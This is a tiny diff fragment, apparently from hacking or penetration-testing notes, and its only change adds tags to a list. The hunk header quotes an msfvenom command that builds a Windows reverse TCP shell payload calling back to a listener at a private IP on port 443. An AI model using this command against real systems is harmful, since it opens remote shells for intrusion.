@@ -19,4 +19,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 EXITFUNC=threa
 
 Tags:
 
-    #pwn #hacking
+    #pwn #hacking #trick #command
